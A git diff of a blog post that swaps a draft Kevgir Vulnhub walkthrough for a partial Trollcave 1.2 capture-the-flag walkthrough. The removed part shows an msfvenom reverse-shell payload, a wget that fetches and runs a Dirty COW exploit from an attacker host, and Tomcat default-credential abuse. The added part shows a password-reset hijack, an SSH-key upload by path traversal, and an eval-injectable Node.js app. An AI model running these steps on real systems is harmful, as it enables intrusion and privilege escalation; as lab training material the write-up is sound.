@@ -1,271 +1,359 @@
 ---
 layout: post
-title:  "Trpllcave: Vulnhub Walkthrough"
+title:  "Trollcave 1.2: Vulnhub Walkthrough"
 date:   2015-08-18 15:07:19
 categories: [tutorial]
 comments: true
 ---
-You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run `jekyll serve`, which launches a web server and auto-regenerates your site when a file is updated.
-
-To add new posts, simply add a file in the `_posts` directory that follows the convention `YYYY-MM-DD-name-of-post.ext` and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.
+This is a boot2root machine that was created by [David Yates][2], and hosted at [VulnHub][3]. The VM is a vulnerable community blog site that requires us to find any misconfigurations and use these to escalate our privileges to gain root. It a bit different as it 'avoids the more esoteric VMisms' as stated by  the author. Its different and quite interesting though. You'll definitely learn something new. Hope you enjoy.
 
 <!--more-->
 ## Information Gathering
-We'll start with an nmap `scan`:
+We start of with an nmap scan and get these ports open: 
+PORT   STATE SERVICE                                                                                                                                                  
+22/tcp open  ssh                                                                                                                                                      
+80/tcp open  http                                                                                                                                                     
+                                                                                                                                                                      
 
-{% highlight ruby %}
-root@marksmith:~# nmap -A -T4 -p- 192.168.175.135 
+Port 80:
+![5-1.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-1.png)
 
-Starting Nmap 7.40 ( https://nmap.org ) at 2017-09-21 16:33 EDT
-Nmap scan report for 192.168.175.135
-Host is up (0.00031s latency).
-Not shown: 65517 closed ports
-PORT      STATE SERVICE     VERSION
-25/tcp    open  ftp         vsftpd 3.0.2
-|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D
-80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-|_http-title: Kevgir VM
-111/tcp   open  rpcbind     2-4 (RPC #100000)
-| rpcinfo: 
-|   program version   port/proto  service
-|   100000  2,3,4        111/tcp  rpcbind
-|   100000  2,3,4        111/udp  rpcbind
-|   100003  2,3,4       2049/tcp  nfs
-|   100003  2,3,4       2049/udp  nfs
-|   100005  1,2,3      41707/tcp  mountd
-|   100005  1,2,3      58790/udp  mountd
-|   100021  1,3,4      38993/udp  nlockmgr
-|   100021  1,3,4      39991/tcp  nlockmgr
-|   100024  1          35893/tcp  status
-|   100024  1          60075/udp  status
-|   100227  2,3         2049/tcp  nfs_acl
-|_  100227  2,3         2049/udp  nfs_acl
-139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
-1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
-|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
-|_  256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
-2049/tcp  open  nfs_acl     2-3 (RPC #100227)
-6379/tcp  open  redis       Redis key-value store
-8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
-| http-methods: 
-|_  Potentially risky methods: PUT DELETE
-|_http-open-proxy: Proxy might be redirecting requests
-|_http-server-header: Apache-Coyote/1.1
-|_http-title: Apache Tomcat
-8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
-|_http-generator: Joomla! 1.5 - Open Source Content Management
-| http-robots.txt: 14 disallowed entries 
-| /administrator/ /cache/ /components/ /images/ 
-| /includes/ /installation/ /language/ /libraries/ /media/ 
-|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-|_http-title: Welcome to the Frontpage
-9000/tcp  open  http        Jetty winstone-2.9
-| http-robots.txt: 1 disallowed entry 
-|_/
-|_http-server-header: Jetty(winstone-2.9)
-|_http-title: Dashboard [Jenkins]
-35871/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
-| ssh-hostkey: 
-|_  2048 97:bb:2c:13:54:2f:88:0d:00:c6:80:24:30:d6:29:54 (RSA)
-35893/tcp open  status      1 (RPC #100024)
-37685/tcp open  mountd      1-3 (RPC #100005)
-39991/tcp open  nlockmgr    1-4 (RPC #100021)
-41707/tcp open  mountd      1-3 (RPC #100005)
-51940/tcp open  unknown
-| fingerprint-strings: 
-|   DNSStatusRequest: 
-|     Unrecognized protocol:
-|   DNSVersionBindReq: 
-|     Unrecognized protocol: 
-|     version
-|_    bind
-58853/tcp open  mountd      1-3 (RPC #100005)
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port51940-TCP:V=7.40%I=7%D=9/21%Time=59C42236%P=x86_64-pc-linux-gnu%r(D
-SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
-SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
-SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");
-MAC Address: 00:0C:29:74:7A:29 (VMware)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.6
-Network Distance: 1 hop
-Service Info: Host: CANYOUPWNME; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+Looks like a ruby site. 
+Users are
 
-Host script results:
-|_clock-skew: mean: 4d15h32m10s, deviation: 0s, median: 4d15h32m10s
-|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-| smb-os-discovery: 
-|   OS: Unix (Samba 4.1.6-Ubuntu)
-|   Computer name: canyoupwnme
-|   NetBIOS computer name: CANYOUPWNME\x00
-|   Domain name: 
-|   FQDN: canyoupwnme
-|_  System time: 2017-09-26T15:07:36+03:00
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-|_smbv2-enabled: Server supports SMBv2 protocol
+![5-2.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-2.png)
 
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.31 ms 192.168.175.135
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 143.39 seconds
-
-{% endhighlight %}
-
-Just a spoiler there are several ways to get a shell on this box. I'll show you below. There are several http ports open. 
-We shall enumerate all of them http ports using dirb.
-
-dirb http://192.168.175.135
-This doesn't give much
-
-## Method One: Tomcat
-
-Navigating to http://192.168.175.135:8080 shows that its running a tomcat server. We'll bruteforce for any hidden directories or simply try `/manager` as its common on tomcat
-
-dirb http://192.168.175.135:8080
+We'll use wfuzz:
 ```
-URL_BASE: http://192.168.175.135:8080/
----- Scanning URL: http://192.168.175.135:8080/ ----
-==> DIRECTORY: http://192.168.175.135:8080/docs/
-==> DIRECTORY: http://192.168.175.135:8080/examples/
-==> DIRECTORY: http://192.168.175.135:8080/host-manager/
-+ http://192.168.175.135:8080/index.html (CODE:200|SIZE:1895)
-==> DIRECTORY: http://192.168.175.135:8080/manager/
-==> DIRECTORY: http://192.168.175.135:8080/META-INF/
+kali@kali:~/vulnhub/trollcave$ wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt  --hc 404 http://192.168.251.9/FUZZ                                   
 
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.251.9/FUZZ
+Total requests: 949
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000000035:   302        0 L      5 W      92 Ch       "admin"
+000000415:   302        0 L      5 W      92 Ch       "inbox"
+000000487:   200        62 L     143 W    2208 Ch     "login"
+000000677:   302        0 L      5 W      87 Ch       "register"
+000000685:   302        0 L      5 W      92 Ch       "reports"
+000000865:   302        0 L      5 W      92 Ch       "users"
+
+Total time: 5.512880
+Processed Requests: 949
+Filtered Requests: 943
+Requests/sec.: 172.1423
 ```
 
-... and what do you know
-Going to the manager link
-`http://192.168.175.135:8080/manager`
-asks for a password. We do have a file that has a passwords for Tomcat servers. We try some default passwords. If not we can try to brute-force using hydra;
+![5-3.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-3.png)
 
-#### Insert hydra command here;
-We'll use 
-username: tomcat 
-password:tomcat
+To get the links on the page:
 
-and we're in. 
-### Insert image here.
+	curl -s http://192.168.251.9 | grep -Po '(href|src)=".{2,}"' | cut -d '"' -f2 | sort -u
+ 
+ 
 
-Now we know tomcat runs java hence jsp hence we'll use this to generate a payload;
+Enumerate the users:
+When we do 
 ```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.227.135 LPORT=80 -f war > rs.war
+curl -s http://192.168.251.9/users/1 
+<ol class='user-blogs'><li class='blog-excerpt' id='blog-7'>
+<img class="user_avatar" src="/uploads/King/crown.png" alt="Crown" width="80" height="80" />
+<h1><a href="/blogs/7">Welcome to the TrollCave!</a></h1>
+<div class='author'>
+by
+__<a href="/users/1">King</a>__
+</div>
+<p><p>The Trollcave is a community blogging website for people with a sense of humour. As long as you&#39;re not an idiot, we&#39;re very friendly. Registration is free, so <a href="/register">what are you waiting for</a>?...</p>
+</p>
 ```
-On the attackers box we can either use msfconsole or nc as follows
-
-### Start a listener in msfconsole
+Thus for all users
 ```
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 10.11.0.250; set LPORT 80; set ExitOnSession false; exploit -j"
+kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/users/{1..20} | grep -v 'href\|doesn' | grep -Po 'h1>.{2,}</h1' | sort -u
+
+h1>anybodyhome's page</h1
+h1>artemus's page</h1
+h1>coderguy's page</h1
+h1>cooldude89's page</h1
+h1>dave's page</h1
+h1>dragon's page</h1
+h1>Ian's page</h1
+h1>kev's page</h1
+h1>King's page</h1
+h1>MrPotatoHead's page</h1
+h1>notanother's page</h1
+h1>onlyme's page</h1
+h1>Q's page</h1
+h1>Sir's page</h1
+h1>teflon's page</h1
+h1>TheDankMan's page</h1
+h1>xer's page</h1
 ```
-### Start a nc listener
+Another way round this is:
 ```
-nc -lnvp 80
+kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/users/{1..20}.json
+
+h1>xer's page</h1
+kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/users/{1..20}.json
+{"id":1,"name":"King","email":"king@trollcave.com","password":null,"created_at":"2017-10-23T09:39:41.494Z","updated_at":"2020-05-01T06:40:12.220Z"}{"id":2,"name":"dave","email":"david@32letters.com","password":null,"created_at":"2017-10-23T09:39:41.617Z","updated_at":"2020-05-01T06:40:12.238Z"}{"id":3,"name":"dragon","email":"dragon@trollcave.com","password":null,"created_at":"2017-10-23T09:39:41.710Z","updated_at":"2020-05-01T06:40:12.256Z"}{"id":4,"name":"coderguy","email":"coderguy@trollcave.com","password":null,"created_at":"2017-10-23T09:39:41.805Z","updated_at":"2020-05-01T06:40:12.273Z"}{"id":5,"name":"cooldude89","email":"kewldewdeightynine@zmail.com","password":null,"created_at":"2017-10-23T09:39:41.894Z","updated_at":"2020-05-01T06:40:12.291Z"}{"id":6,"name":"Sir","email":"sir@zmail.com","password":null,"created_at":"2017-10-23T09:39:41.985Z","updated_at":"2020-05-01T06:40:12.310Z"}{"id":7,"name":"Q","email":"q@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.075Z","updated_at":"2020-05-01T06:40:12.331Z"}{"id":8,"name":"teflon","email":"tf@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.151Z","updated_at":"2020-05-01T06:40:12.348Z"}{"id":9,"name":"TheDankMan","email":"dope@dankmail.com","password":null,"created_at":"2017-10-23T09:39:42.240Z","updated_at":"2020-05-01T06:40:12.363Z"}{"id":10,"name":"artemus","email":"artemus_12145@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.318Z","updated_at":"2020-05-01T06:40:12.383Z"}{"id":11,"name":"MrPotatoHead","email":"potatoe@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.395Z","updated_at":"2020-05-01T06:40:12.424Z"}{"id":12,"name":"Ian","email":"iane@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.472Z","updated_at":"2020-05-01T06:40:12.447Z"}{"id":13,"name":"kev","email":"kevin@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.548Z","updated_at":"2020-05-01T06:40:12.477Z"}{"id":14,"name":"notanother","email":"notanother@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.626Z","updated_at":"2020-05-01T06:40:12.497Z"}{"id":15,"name":"anybodyhome","email":"anybodyhome@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.702Z","updated_at":"2020-05-01T06:40:12.517Z"}{"id":16,"name":"onlyme","email":"onlymememe@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.779Z","updated_at":"2020-05-01T06:40:12.536Z"}{"id":17,"name":"xer","email":"xer@zmail.com","password":null,"created_at":"2017-10-23T09:39:42.856Z","updated_at":"2020-05-01T06:40:12.553Z"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}
 ```
-## Method Two: Joomla
-
-We'll follow the same drill. Port 8081 is running Joomla, hence we'll bruteforce for any hidden directories.
-dirb http://192.168.175.135:8081 
+We can also enumerate for the reports directory:
 ```
-URL_BASE: http://192.168.175.135:8081/
----- Scanning URL: http://192.168.175.135:8081/ ----
-==> DIRECTORY: http://192.168.175.135:8081/administrator/
-==> DIRECTORY: http://192.168.175.135:8081/cache/
-+ http://192.168.175.135:8081/cgi-bin/ (CODE:403|SIZE:292)
-==> DIRECTORY: http://192.168.175.135:8081/components/
-==> DIRECTORY: http://192.168.175.135:8081/images/
-==> DIRECTORY: http://192.168.175.135:8081/includes/
-+ http://192.168.175.135:8081/index.php (CODE:200|SIZE:4047)
-==> DIRECTORY: http://192.168.175.135:8081/javascript/
-==> DIRECTORY: http://192.168.175.135:8081/language/
-==> DIRECTORY: http://192.168.175.135:8081/libraries/
-==> DIRECTORY: http://192.168.175.135:8081/logs/
-==> DIRECTORY: http://192.168.175.135:8081/media/
-==> DIRECTORY: http://192.168.175.135:8081/modules/
-==> DIRECTORY: http://192.168.175.135:8081/phpmyadmin/
-==> DIRECTORY: http://192.168.175.135:8081/plugins/
-+ http://192.168.175.135:8081/robots.txt (CODE:200|SIZE:304)
-+ http://192.168.175.135:8081/server-status (CODE:403|SIZE:297)
-==> DIRECTORY: http://192.168.175.135:8081/templates/
-==> DIRECTORY: http://192.168.175.135:8081/tmp/
-==> DIRECTORY: http://192.168.175.135:8081/xmlrpc/
+kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/reports/{1..20}.json
 
+{"id":1,"content":"offensive comment, not even clever.","user":{"id":17,"name":"xer","email":"xer@zmail.com","password_hint":"fave pronoun","password_digest":"$2a$10$W2Y0kBt5mAae81o9yK.hSe7SG3mgVQmIXT/O13hGJlJ8qMDtxz0VG","remember_digest":null,"role":1,"hits":43,"last_seen_at":"2020-05-01T02:59:37.579Z","banned":null,"created_at":"2017-10-23T09:39:42.856Z","updated_at":"2020-05-01T06:40:12.553Z","avatar_id":null,"reset_digest":null,"reset_sent_at":"2020-05-01T02:58:30.811Z"},"blog":{"id":4,"title":"Politics \u0026 religion thread","content":"\nLet's discuss our political and religious beliefs. Try to keep it civil -- I will be monitoring this thread closely and handing out warns to anyone who starts making trouble.\n\nAs for my beliefs, I am a moderate upper wing Xen Scientologist, and I believe in equal wrongs for all.\n\t\t","clearance":0,"user_id":5,"created_at":"2017-10-23T09:39:42.962Z","updated_at":"2017-10-23T09:39:42.962Z"},"comment_id":2,"created_at":"2017-10-23T09:39:42.998Z","updated_at":"2017-10-23T09:39:42.998Z"}{"id":2,"content":"yellow too light to read","user":{"id":16,"name":"onlyme","email":"onlymememe@zmail.com","password_hint":"It is what it is","password_digest":"$2a$10$AEQuFMHHVaJOSYEpBLBq/.YOiybWcjWMgk7xIVGVq7E9VWzTgdl2.","remember_digest":null,"role":1,"hits":40,"last_seen_at":null,"banned":null,"created_at":"2017-10-23T09:39:42.779Z","updated_at":"2020-05-01T06:40:12.536Z","avatar_id":null,"reset_digest":null,"reset_sent_at":null},"blog":{"id":5,"title":"markdown","content":"\ngood news everybody! i've added a new feature to blogs: you can now use [markdown](https://daringfireball.net/projects/markdown/) to *format* **your** ~~posts~~.\n\nlookin forward to all the pretty new posts :)\n\t\t","clearance":1,"user_id":4,"created_at":"2017-10-23T09:39:43.012Z","updated_at":"2017-10-23T09:39:43.012Z"},"comment_id":3,"created_at":"2017-10-23T09:39:43.043Z","updated_at":"2017-10-23T09:39:43.043Z"}{"id":3,"content":"attempted hacking","user":{"id":2,"name":"dave","email":"david@32letters.com","password_hint":"nah lol","password_digest":"$2a$10$9qvAMgymdDz01DDp0yjLyeaQUWWiMjAn8T8qxLrs4eLkV6m8yZyH6","remember_digest":null,"role":4,"hits":63,"last_seen_at":null,"banned":null,"created_at":"2017-10-23T09:39:41.617Z","updated_at":"2020-05-01T06:43:15.505Z","avatar_id":null,"reset_digest":null,"reset_sent_at":null},"blog":{"id":7,"title":"Welcome to the TrollCave!","content":"\nThe Trollcave is a community blogging website for people with a sense of humour. As long as you're not an idiot, we're very friendly. Registration is free, so [what are you waiting for](/register)?\n\t\t","clearance":0,"user_id":1,"created_at":"2017-10-23T09:39:43.103Z","updated_at":"2017-10-23T09:39:43.103Z"},"comment_id":7,"created_at":"2017-10-23T09:39:43.144Z","updated_at":"2017-10-23T09:39:43.144Z"}{"id":4,"content":"adds nothing to discussion","user":{"id":8,"name":"teflon","email":"tf@zmail.com","password_hint":"swordfish","password_digest":"$2a$10$l1VKPrNsRN6kMAssBhGgveZ1DDFnPEZM6ZGwTvTPayvSbZPebY1B6","remember_digest":null,"role":3,"hits":34,"last_seen_at":null,"banned":null,"created_at":"2017-10-23T09:39:42.151Z","updated_at":"2020-05-01T06:40:12.348Z","avatar_id":null,"reset_digest":null,"reset_sent_at":null},"blog":{"id":8,"title":"new feature for moderators","content":"\nin order to cope with the massive growth of the site userbase, we are temporarily giving moderators the ability to appoint other moderators. this can be done through the [users](/users) page by clicking the \"mod\" link next to the user you want to promote.\n\nplease use your discretion and only appoint trustworthy, regular members. any abuse of this feature will be grounds for a swift and painful meeting with the banhammer. for both of you. \u003e:(\n\t\t","clearance":3,"user_id":4,"created_at":"2017-10-23T09:39:43.158Z","updated_at":"2017-10-23T09:39:43.158Z"},"comment_id":8,"created_at":"2017-10-23T09:39:43.193Z","updated_at":"2017-10-23T09:39:43.193Z"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","e
 ```
-Another thing we can do is use Joomscan to further enumerate
-`joomscan -u http://192.168.175.135:8081`
-
-### iNSERT image
-Reading through the log we find that `#15` holds something useful. A  vulnerability exists that allows users to change admin password;
-
-### Insert image
-
-We reset the password and log in;
-
-Once we in as admin. We look for a php file we can edit. To do this;
-1. go to Extensions
-2. Template Manager
-3. Selec the active template
-4. Edit the template and save changers.
-
-Once this is done we can execute commands through  the browser. 
-As usual we'll use Burp to intercept and execute the payload;
-
-## Other interests
-This box is also running `Samba` and we can see from the smb enum script, we can Read/Write into the $IPC Service
-
+This contains some passwords
+Once more we do the same for blog:
 ```
-Host script results:                                                      
-| smb-enum-shares:                                                   
-|   account_used: guest                                                   
-|   IPC$:                                                                 
-|     Type: STYPE_IPC_HIDDEN                                              
-|     Comment: IPC Service (canyoupwnme server (Samba, Ubuntu))           
-|     Users: 1                                                            
-|     Max Users: <unlimited>                                              
-|     Path: C:\tmp                                                        
-|     Anonymous access: READ/WRITE                                        
-|     Current user access: READ/WRITE
-
-
-``` 
-
-## Post Exploitation
+kali@kali:~/vulnhub/trollcave$ curl -s http://192.168.251.9/blogs/{1..20}.json
+                                                                                        
+{"id":1,"title":"Dumb ways to die","content":"My favourite one comes from an old Viking legend called the Orkneyingers' Saga.\n \n\u003eAnd so they met and there was 
+a hard battle, and not long ere Melbricta fell and his followers, and Sigurd caused the heads to be fastened to his horses’ cruppers as a glory for himself.  And then
+ they rode home, and boasted of their victory.  And when they were come on the way, then Sigurd wished to spur the horse with his foot, and he struck his calf against
+ the tooth which stuck out of Melbricta’s head and grazed it;  and in that wound sprung up pain and swelling, and that led him to his death.\n\nKilled by a dead guy!\
+n","user_id":12,"created_at":"2017-10-23T09:39:42.887Z","updated_at":"2017-10-23T09:39:42.887Z"}{"id":2,"title":"First post","content":"\nHi, I'm Dave! I'm an adminis
+trator on this site, and that makes me better than you.\n\nKneel before me, peasants!\n\n/jk\n\nbut serious, kneel\n\t\t","user_id":2,"created_at":"2017-10-23T09:39:4
+2.907Z","updated_at":"2017-10-23T09:39:42.907Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html>{"id":4,"title":"Politics \u002
+6 religion thread","content":"\nLet's discuss our political and religious beliefs. Try to keep it civil -- I will be monitoring this thread closely and handing out wa
+rns to anyone who starts making trouble.\n\nAs for my beliefs, I am a moderate upper wing Xen Scientologist, and I believe in equal wrongs for all.\n\t\t","user_id":5
+,"created_at":"2017-10-23T09:39:42.962Z","updated_at":"2017-10-23T09:39:42.962Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></htm
+l>{"id":6,"title":"password reset","content":"\nso i've been getting a lot of emails lately from users who forgot their passwords and need to reset them. because the 
+site doesn't have one of those 'forgot password' buttons, i've been having to do all the resets manually. i'm getting really tired of it\n\nergo it's time to implemen
+t password reset. busy with this at the moment, but having trouble with site emails. you might have noticed that activation has been turned off for new users because 
+of this.\n\nso far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating. if anyone has 
+any suggestions about how to get the email working, please drop me a pm\n\n--coderguy\n\t\t","user_id":4,"created_at":"2017-10-23T09:39:43.057Z","updated_at":"2017-10-23T09:39:43.057Z"}{"id":7,"title":"Welcome to the TrollCave!","content":"\nThe Trollcave is a community blogging website for people with a sense of humour. As long as you're not an idiot, we're very friendly. Registration is free, so [what are you waiting for](/register)?\n\t\t","user_id":1,"created_at":"2017-10-23T09:39:43.103Z","updated_at":"2017-10-23T09:39:43.103Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html><html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html><html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html>{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}
+```
+Remember when reading about: 
 
 ```
-uname -a
-Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
+so far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating
 ```
-From this kernel version we can attempt a kernel exploit.
-It may crash the system but we'll still try it.
-We'll attempt to use the dirtycow exploit.
-####Add link to dirtycow
-```
-wget http://192.168.175.132:1234/cowroot.c -O /tmp/cowroot.c
-Edit it for either 32bit or 64bit.
+![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-4.png)
+
+It alludes to using this to reset password.
+http://192.168.251.9/password_resets/new
+
+![5-5.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-5.png)
+
+It sends the link
 
 
-python -c "import pty; pty.spawn('/bin/bash');"
-gcc -pthread cowroot.c -o cowroot && chmod 744 cowroot && ./cowroot asdf
-Once you get a shell enter the following command. chap chap
-echo 0 > /proc/sys/vm/dirty_writeback_centisecs
 
-```
-Other way is to use the suid bit set.
+Note the end of the string has the name parameter. We'll abuse this part.
+We already know all the users. How about resetting password for King `http://192.168.251.9/password_resets/edit.9AY5mR6eT1CmgWazJRsdvw?name=King`
 
-Check out the [Jekyll docs][jekyll] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll’s dedicated Help repository][jekyll-help].
 
-[jekyll]:      http://jekyllrb.com
-[jekyll-gh]:   https://github.com/jekyll/jekyll
-[jekyll-help]: https://github.com/jekyll/jekyll-help
+
+
+Go to admin panel and enable file upload 
+
+
+
+Reading through through the users blogs we come across
+
+
+This tells us we've got a user called `rails` and we've also enabled file upload which was previpusly disabled.
+Attempting to u plad and execute ruby shell proves unfruitful.
+
+We know we already running ssh. We shall then upload a ssh key using directory traversal into the home directory of 
+
+../../../../../../../../home/rails/.ssh/authorized_keys
+
+Generate a ssh key as follows
+
+	ssh-keygen -t rsa -b 2048
+
+
+Upload the key as follows:
+Note we'll upload with user as xer upload as King don't work:
+
+
+
+ssh -i trollcave rails@192.168.251.9
+
+We'll run LinEnum and les.
+
+We'll use LinEnum. The user king has sudo rights  `.sudo_as_admin_successful`
+
+rails@trollcave:~$ ls -lah /home/king/
+total 32K
+drwxr-xr-x 4 king king 4.0K Mar 21  2018 .
+drwxr-xr-x 7 root root 4.0K Oct 23  2017 ..
+-rw------- 1 king king   31 Mar 21  2018 .bash_history
+-rw-r--r-- 1 king king  220 Sep 16  2016 .bash_logout
+-rw-r--r-- 1 king king 3.7K Sep 16  2016 .bashrc
+drwx------ 2 king king 4.0K Sep 16  2016 .cache
+drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
+-rw-r--r-- 1 king king  675 Sep 16  2016 .profile
+-rw-r--r-- 1 king king    0 Sep 16  2016 .sudo_as_admin_successful
+
+He's running a program called 
+
+drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
+
+rails@trollcave:/home/king/calc$ cat calc.js
+var http = require("http");
+var url = require("url");
+var sys = require('sys');
+var exec = require('child_process').exec;
+
+// Start server
+function start(route)
+{
+        function onRequest(request, response)
+        {
+                var theurl = url.parse(request.url);
+                var pathname = theurl.pathname;
+                var query = theurl.query;
+                console.log("Request for " + pathname + query + " received.");
+                route(pathname, request, query, response);
+        }
+
+http.createServer(onRequest).listen(8888, '127.0.0.1');
+console.log("Server started");
+}
+
+// Route request
+function route(pathname, request, query, response)
+{
+        console.log("About to route request for " + pathname);
+        switch (pathname)
+        {
+                // security risk
+                /*case "/ping":
+                        pingit(pathname, request, query, response);
+                        break;  */
+
+                case "/":
+                        home(pathname, request, query, response);
+                        break;
+
+                case "/calc":
+                        calc(pathname, request, query, response);
+                        break;
+
+                default:
+                        console.log("404");
+                        display_404(pathname, request, response);
+                        break;
+        }
+}
+
+function home(pathname, request, query, response)
+{
+        response.end("<h1>The King's Calculator</h1>" +
+                        "<p>Enter your calculation below:</p>" +
+                        "<form action='/calc' method='get'>" +
+                                "<input type='text' name='sum' value='1+1'>" +
+                                "<input type='submit' value='Calculate!'>" +
+                        "</form>" +
+                        "<hr style='margin-top:50%'>" +
+                        "<small><i>Powered by node.js</i></small>"
+                        );
+}
+
+function calc(pathname, request, query, response)
+{
+        sum = query.split('=')[1];
+        console.log(sum)
+        response.writeHead(200, {"Content-Type": "text/plain"});
+
+        response.end(eval(sum).toString());
+}
+
+function ping(pathname, request, query, response)
+{
+        ip = query.split('=')[1];
+        console.log(ip)
+        response.writeHead(200, {"Content-Type": "text/plain"});
+
+        exec("ping -c4 " + ip, function(err, stdout, stderr) {
+                response.end(stdout);
+        });
+}
+
+function display_404(pathname, request, response)
+{
+        response.write("<h1>404 Not Found</h1>");
+        response.end("I don't have that page, sorry!");
+}
+
+// Start the server and route the requests
+start(route);
+rails@trollcave:/home/king/calc$
+
+http.createServer(onRequest).listen(8888, '127.0.0.1');
+console.log("Server started"); 
+
+Its tells us its running on 8888.
+Confirmed by, 
+
+[-] Listening TCP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
+tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      909/ruby2.3
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      - 
+tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      - 
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      - 
+tcp6       0      0 :::22                   :::*                    LISTEN      - 
+tcp6       0      0 ::1:5432                :::*                    LISTEN      - 
+
+We also know that,
+
+function calc(pathname, request, query, response)
+{
+        sum = query.split('=')[1];
+        console.log(sum)
+        response.writeHead(200, {"Content-Type": "text/plain"});
+
+        response.end(eval(sum).toString());
+}
+ The eval value is exploitable: 
+
+We'll do some port forwarding
+kali@kali:~/vulnhub/trollcave$ ssh -L 8888:127.0.0.1:8888 -i trollcave rails@192.168.251.9 -f -N
+
+Access the port on our local browser:
+
+localhost:8888
+
+
+
